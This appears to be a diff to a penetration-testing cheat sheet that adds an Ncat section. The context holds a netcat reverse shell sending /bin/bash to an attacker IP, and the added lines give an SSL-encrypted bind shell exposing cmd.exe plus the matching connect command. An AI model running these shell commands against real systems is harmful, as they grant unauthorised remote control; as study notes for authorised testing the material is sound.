@@ -38,6 +38,15 @@ nc -nvlp [port]                       # ATT: attacker set up listener
 nc -nv [ATT IP] [port] -e /bin/bash   # VIC: attacker sends reverse shell to their box
 ```
 
+**Ncat**  
+Ncat is an improved version of the Netcat tool, with SSL encryption + ability to whitelist access to specific IP's.
+
+Secure Bind Shell:
+```bash
+ncat -lvp 4444 -e cmd.exe --allow [IP] --ssl   # Box A: set up listener, allow on connections from only IP, SSL-encrypted.
+ncat -v 10.11.14.143 4444 --ssl                # Box B: connect to Box A, SSL-encrypted.
+```
+
 
 
 
